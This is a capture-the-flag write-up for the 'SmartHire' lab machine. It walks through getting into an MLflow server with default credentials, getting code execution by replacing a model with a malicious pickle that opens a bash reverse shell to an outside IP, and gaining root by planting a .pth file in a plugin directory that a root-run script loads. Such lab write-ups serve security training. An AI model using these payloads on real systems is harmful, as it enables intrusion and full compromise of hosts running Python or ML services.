# SmartHire

**Machine:** SmartHire\
**OS:** Linux\
**Difficulty:** Medium

***

### Overview

SmartHire is a Linux machine built around a web application and an MLflow machine-learning infrastructure.

The attack chain is:

```
Web Enumeration
      ↓
models.smarthire.htb
      ↓
MLflow
      ↓
Default Credentials
      ↓
MLflow Model Artifact
      ↓
Python Pickle Deserialization
      ↓
Foothold as svcweb
      ↓
Python 3.10 Environment
      ↓
Privilege Escalation
      ↓
Root
```

The interesting part of the machine is the abuse of an MLflow-hosted Python model. The application loads a serialized `pickle` model, allowing a malicious pickle to achieve code execution.

***

## 1. Reconnaissance

I started with a full TCP port scan:

```bash
nmap -p- --min-rate 10000 <TARGET_IP>
```

I then enumerated the discovered services:

```bash
nmap -p 22,80 -sCV <TARGET_IP>
```

The web application was hosted on:

```
smarthire.htb
```

I added the hostname to `/etc/hosts`:

```bash
echo "<TARGET_IP> smarthire.htb" | sudo tee -a /etc/hosts
```

***

## 2. Web Enumeration

The main website exposed functionality related to the SmartHIRE recruitment application.

I enumerated the web application and its virtual hosts.

```bash
ffuf -u http://smarthire.htb/ \
     -H 'Host: FUZZ.smarthire.htb' \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -ac
```

This revealed:

```
models.smarthire.htb
```

I added the new hostname:

```bash
echo "<TARGET_IP> models.smarthire.htb" | sudo tee -a /etc/hosts
```

***

## 3. MLflow

Visiting:

```
http://models.smarthire.htb
```

revealed an MLflow instance.

The MLflow API required authentication.

During enumeration, the credentials:

```
admin:password
```

were found to work.

I could therefore interact with the MLflow artifact API.

***

## 4. Enumerating the Application Data

The SmartHIRE application worked with candidate information in CSV format.

The expected structure was:

```csv
name,skills,experience,education,position_applied,previous_company
John Smith,"Python, Machine Learning, SQL",60,Master's in CS,Data Scientist,TechCorp
Sarah Johnson,"JavaScript, React, Node.js",36,Bachelor's in SE,Full Stack Dev,StartupXYZ
Mike Brown,"Java, Spring Boot, PostgreSQL",84,Bachelor's in IT,Backend Developer,Enterprise Inc
```

The application used a machine-learning model stored in MLflow.

***

## 5. Downloading the Model Artifact

The model artifact could be accessed through the MLflow artifact API.

I downloaded the Python model:

```bash
curl -u admin:password -o - \
http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/32ab8e5f6f9c4768ba9d8739dec1616b/artifacts/model/python_model.pkl
```

The important file was:

```
python_model.pkl
```

This immediately suggested investigating how the application loaded the model.

***

## 6. Python Version Enumeration

I enumerated the environment and got to know that foothold has py version 3.10

***

## 7. Understanding Python Pickle

The model was serialized using Python's `pickle` mechanism.

Pickle is dangerous when untrusted data is deserialized because it is capable of invoking functions during object reconstruction.

The key mechanism is the `__reduce__()` method.

A malicious object can specify:

```python
def __reduce__(self):
    return some_function, (arguments,)
```

When Python later deserializes the object, the specified function can be invoked.

This gives us a code-execution primitive.

***

## 8. Creating the Malicious Pickle

I created the following payload:

```python
import pickle, os

class Payload:
    def __reduce__(self):
        return os.system, ("bash -c 'bash -i >& /dev/tcp/10.10.14.171/9001 0>&1'",)

with open("payload1.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

The resulting execution flow is:

```
payload.pkl
     ↓
pickle.load()
     ↓
Payload.__reduce__()
     ↓
os.system
     ↓
10.10.14.171:9001
```

The `os` import is not required for this particular payload.

***

## 9. Generating the Payload with Python 3.10

Because the target environment was running Python 3.10, I generated the pickle using the same Python version.

Using `uv`:

```bash
uv run --python 3.10 payload.py
```

This generated:

```
payload.pkl
```

The important point is that `uv` lets us explicitly select Python 3.10 rather than relying on whatever Python version happens to be installed on Kali.

***

## 10. Replacing the MLflow Model

The vulnerable model artifact was:

```
model/python_model.pkl
```

The original artifact could be accessed using:

```bash
curl -u admin:password -o - \
http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/32ab8e5f6f9c4768ba9d8739dec1616b/artifacts/model/python_model.pkl
```

The malicious pickle was then used in place of the original model artifact.

The objective was to make the SmartHIRE application load our malicious object when it subsequently loaded the model.

***

## 11. Triggering the Deserialization

The `/predict` functionality causes the application to load the machine-learning model.

Therefore, after replacing the model artifact, accessing the prediction functionality causes the application to deserialize our malicious pickle.

The chain becomes:

```
/predict
   ↓
Load ML model
   ↓
Load python_model.pkl
   ↓
pickle deserialization
   ↓
__reduce__()
   ↓
os.system()
```

This provides code execution in the context of the application.

The resulting foothold was obtained as:

```
svcweb
```

***

if this doesnt work then you can use:

```bash
https://github.com/MAVERICK-VF142/Maverick-Scripts/blob/main/HTB/smarthire/intial_foothold_rce_smarthire.py
```

## 12. Foothold Enumeration

Once inside the machine, I started enumerating the environment:

```bash
whoami
id
hostname
pwd
```

The Python environment was particularly interesting:

```bash
python3 --version
```

which returned:

```
Python 3.10
```

This confirmed the Python runtime that was relevant to the exploitation chain.

***

## 13. Privilege Escalation Enumeration

### Privilege Escalation

With the foothold as `svcweb`, I started looking for a way to escalate privileges.

First, I checked the available sudo permissions:

```
sudo -l
```

This revealed that I could execute the MLflow management script as `root`.

I inspected the script:

```
cat /opt/tools/mlflow_ctl/mlflowctl.py
```

The script uses Python's `site.addsitedir()` to load the development plugin directory:

```
/opt/tools/mlflow_ctl/plugins/dev/
```

The important detail is that this directory is **writable by `svcweb`**.

#### Abusing `.pth` Files

Python automatically processes `.pth` files when `site.addsitedir()` is called. A `.pth` file containing an `import` statement can therefore execute Python code.

Since `svcweb` can write to the plugin directory, I created a malicious `.pth` file:

```
echo 'import os; os.system("/bin/bash -p")' > /opt/tools/mlflow_ctl/plugins/dev/evil.pth
```

The payload:

```
import osos.system("/bin/bash -p")
```

launches a privileged Bash shell.

I then triggered the vulnerable script through the sudo permission:

```
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

Because the script runs as `root` and calls `site.addsitedir()` on the writable plugin directory, Python processes `evil.pth` and executes the embedded import.

This gives a root shell.

I verified the privilege escalation with:

```
whoami
```

which returned:

```
root
```

Finally, I retrieved the root flag:

```
cat /root/root.txt
```

#### Privilege Escalation Chain

```
svcweb
   ↓
sudo -l
   ↓
mlflowctl.py executable as root
   ↓
site.addsitedir()
   ↓
/opt/tools/mlflow_ctl/plugins/dev/
   ↓
Writable by svcweb
   ↓
evil.pth
   ↓
Python executes import
   ↓
/bin/bash -p
   ↓
root
```

